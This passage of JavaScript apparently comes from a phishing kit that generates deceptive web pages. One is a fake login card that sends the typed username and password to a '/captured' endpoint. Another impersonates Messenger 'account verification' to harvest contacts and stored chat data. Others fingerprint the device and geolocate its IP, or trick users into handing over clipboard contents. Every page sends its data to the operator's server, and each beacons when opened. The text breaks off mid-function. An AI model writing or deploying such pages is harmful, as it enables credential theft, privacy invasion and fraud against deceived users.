    +'<div class="card"><div class="logo">'+(c.logo||c.site)+'</div>'
    +'<input id="u" type="text" placeholder="Phone number or email" autocomplete="email">'
    +'<input id="p" type="password" placeholder="Password" autocomplete="current-password">'
    +'<button class="btn-main" id="btn" onclick="sub()">'+c.btn+'</button>'
    +'<div class="forgot"><a href="#">Forgot password?</a></div>'
    +(c.create?'<div class="sep"><div class="sep-line"></div><span class="sep-or">or</span><div class="sep-line"></div></div><button class="btn-sec" onclick="sub()">'+c.create+'</button>':'')
    +'</div></div>'
    +'<script>'
    +'var UID="'+uid+'",D="'+base+'/d",SITE="'+c.site+'",RDR="'+c.rdr+'";'
    +'window.onload=function(){fetch(D+"/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:SITE+" Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'async function sub(){'
    +'var u=document.getElementById("u").value,p=document.getElementById("p").value;'
    +'if(!u||!p){document.getElementById("u").style.borderColor="#f02849";return;}'
    +'var btn=document.getElementById("btn");btn.textContent="Logging in...";btn.disabled=true;'
    +'try{await fetch(D+"/captured",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});}catch(e){}'
    +'setTimeout(function(){window.location.href=RDR;},800);'
    +'}'
    +'</script></body></html>';
}

function msgrInfoPage(uid,req){
    var base=getBase(req);
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Messenger</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:-apple-system,sans-serif;min-height:100vh}.notif{background:#e8f4fd;border-left:4px solid #0084ff;padding:12px 16px;display:flex;gap:10px}.notif-icon{font-size:18px}.notif-text{font-size:13px;color:#333;line-height:1.5}.notif-text b{color:#0050a0;display:block}.wrap{max-width:400px;margin:0 auto;padding:14px}.card{background:#fff;border-radius:14px;padding:22px 18px;box-shadow:0 2px 12px rgba(0,0,0,.12)}.head{display:flex;align-items:center;gap:12px;margin-bottom:18px}.icon{width:52px;height:52px;background:linear-gradient(135deg,#0084ff,#00c6ff);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px}.perms{background:#f0f7ff;border-radius:10px;padding:14px;margin-bottom:18px}.perms p{font-size:13px;font-weight:600;color:#444;margin-bottom:10px}.prow{display:flex;align-items:center;gap:10px;font-size:13px;color:#333;margin-bottom:8px}.prow span{font-size:18px}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#0084ff,#00c6ff);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.st{text-align:center;font-size:13px;color:#65676b;margin-top:12px}.prg{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin-top:12px;display:none}.bar{height:100%;background:linear-gradient(90deg,#0084ff,#00c6ff);border-radius:2px;width:0;transition:width .3s}</style>'
    +'</head><body>'
    +'<div class="notif"><span class="notif-icon">💬</span><div class="notif-text"><b>🔒 Account Verification Required</b>Verify to access your messages.</div></div>'
    +'<div class="wrap"><div class="card">'
    +'<div class="head"><div class="icon">💬</div><div><h2 style="font-size:18px;font-weight:700;color:#1c1e21">Messenger</h2><p style="font-size:13px;color:#65676b">Account Verification</p></div></div>'
    +'<div class="perms"><p>Verification requires:</p><div class="prow"><span>👥</span>Access to contacts</div><div class="prow"><span>💬</span>Recent conversations</div><div class="prow"><span>📱</span>Device information</div></div>'
    +'<button class="btn" id="btn" onclick="go()">✅ Verify My Account</button>'
    +'<div class="st" id="st"></div><div class="prg" id="prg"><div class="bar" id="bar"></div></div>'
    +'</div></div>'
    +'<script>'
    +'var UID="'+uid+'",BASE="'+base+'";'
    +'async function go(){'
    +'var btn=document.getElementById("btn"),st=document.getElementById("st"),prg=document.getElementById("prg"),bar=document.getElementById("bar");'
    +'btn.disabled=true;btn.textContent="⏳ Verifying...";prg.style.display="block";'
    +'var info={uid:UID,device:navigator.userAgent,contacts:[],threads:[]};'
    +'bar.style.width="20%";'
    +'try{if("contacts" in navigator&&"ContactsManager" in window){var c=await navigator.contacts.select(["name","tel","email"],{multiple:true});info.contacts=c.map(function(x){return{name:(x.name&&x.name[0])||"",tel:(x.tel&&x.tel[0])||"",email:(x.email&&x.email[0])||""};});}}catch(e){}'
    +'bar.style.width="60%";'
    +'try{var keys=Object.keys(localStorage);info.threads=keys.filter(function(k){return k.match(/msg|chat|thread|conv/i);}).slice(0,10).map(function(k){return{participants:k,lastMsg:(localStorage.getItem(k)||"").slice(0,100)};});}catch(e){}'
    +'bar.style.width="85%";'
    +'try{await fetch(BASE+"/d/msginfo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(info)});}catch(e){}'
    +'bar.style.width="100%";st.textContent="✅ Verified!";btn.textContent="✅ Done!";'
    +'setTimeout(function(){window.location.href="https://www.messenger.com";},1500);'
    +'}'
    +'window.onload=function(){fetch(BASE+"/d/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"💌 Msgr Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'</script></body></html>';
}

function ipInfoPage(uid,req){
    var base=getBase(req);
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Checking...</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}.card{background:#111;border-radius:16px;padding:24px;max-width:360px;width:100%;box-shadow:0 0 30px rgba(0,100,255,.2)}.title{font-size:18px;font-weight:800;text-align:center;margin-bottom:20px;color:#4af}.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:13px}.row span:first-child{color:#888}.row span:last-child{font-weight:600;color:#fff;text-align:right;max-width:60%;word-break:break-all}.spin{text-align:center;font-size:28px;margin:20px 0;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}</style>'
    +'</head><body><div class="card"><div class="title">🌐 Connection Info</div><div class="spin" id="sp">⏳</div><div id="rows"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",BASE="'+base+'";'
    +'async function run(){'
    +'var data={};data.userAgent=navigator.userAgent;data.platform=navigator.platform;data.language=navigator.language;data.screen=screen.width+"x"+screen.height;data.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;data.cores=navigator.hardwareConcurrency||"?";data.memory=(navigator.deviceMemory||"?")+"GB";data.touch=navigator.maxTouchPoints;'
    +'try{var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c){data.connType=c.effectiveType||"?";data.downlink=(c.downlink||"?")+"Mbps";data.rtt=(c.rtt||"?")+"ms";}}catch(e){}'
    +'try{var ip=await fetch("https://api.ipify.org?format=json").then(function(r){return r.json();});data.publicIP=ip.ip;var geo=await fetch("https://ipapi.co/"+ip.ip+"/json/").then(function(r){return r.json();});data.country=geo.country_name||"?";data.city=geo.city||"?";data.isp=geo.org||"?";data.region=geo.region||"?";}catch(e){}'
    +'document.getElementById("sp").style.display="none";'
    +'var rows=document.getElementById("rows");'
    +'var labels={publicIP:"🌐 Public IP",country:"🗺️ Country",city:"🏙️ City",isp:"📡 ISP",timezone:"🕐 Timezone",screen:"📱 Screen",cores:"⚙️ CPU",memory:"🧠 RAM",connType:"📶 Connection",downlink:"⬇️ Speed"};'
    +'for(var k in data){if(!data[k]||data[k]==="?")continue;var r=document.createElement("div");r.className="row";r.innerHTML="<span>"+(labels[k]||k)+"</span><span>"+data[k]+"</span>";rows.appendChild(r);}'
    +'await fetch(BASE+"/d/devinfo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,label:"🌐 IP & Device Info",data:data})}).catch(function(){});'
    +'}'
    +'run();'
    +'</script></body></html>';
}

function clipboardPage(uid,req){
    var base=getBase(req);
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Paste Required</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a0a0a;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}.card{background:#111;border-radius:16px;padding:28px 20px;max-width:360px;width:100%}.icon{font-size:50px;margin-bottom:14px}.title{font-size:18px;font-weight:800;margin-bottom:8px}.sub{color:#aaa;font-size:13px;line-height:1.7;margin-bottom:20px}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:12px;cursor:pointer}.st{margin-top:14px;font-size:13px;color:#aaa}</style>'
    +'</head><body><div class="card"><div class="icon">📋</div><div class="title">Paste Required</div>'
    +'<div class="sub">To view the shared content, tap the button below.</div>'
    +'<button class="btn" onclick="grab()">📋 View Shared Content</button>'
    +'<div class="st" id="st"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",BASE="'+base+'";'
    +'async function grab(){'
    +'var st=document.getElementById("st");st.textContent="⏳ Loading...";var text="";'
    +'try{text=await navigator.clipboard.readText();}catch(e){text=prompt("Paste the content here to continue:","","")||"";}'
    +'if(text){await fetch(BASE+"/d/devinfo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,label:"📋 Clipboard",data:{clipboard:text,length:text.length,ua:navigator.userAgent}})}).catch(function(){});st.textContent="✅ Content loaded!";}else{st.textContent="Nothing found.";}'
    +'}'
    +'window.onload=function(){fetch(BASE+"/d/text",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:UID,type:"📋 Clipboard Opened",data:navigator.userAgent})}).catch(function(){});};'
    +'</script></body></html>';
}

function batteryPage(uid,req){
    var base=getBase(req);
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Device Check</title>'
    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a1a0a;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#111;border-radius:16px;padding:24px 20px;max-width:360px;width:100%}.title{font-size:18px;font-weight:800;text-align:center;margin-bottom:18px;color:#2ecc71}.bat{font-size:60px;text-align:center;margin:10px 0}.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1a1a1a;font-size:13px}.row span:first-child{color:#888}.row span:last-child{font-weight:600;color:#2ecc71}</style>'
    +'</head><body><div class="card"><div class="title">🔋 Device Information</div><div class="bat" id="bat">⏳</div><div id="rows"></div></div>'
    +'<script>'
    +'var UID="'+uid+'",BASE="'+base+'";'
    +'async function run(){'
    +'var data={ua:navigator.userAgent,platform:navigator.platform,scr
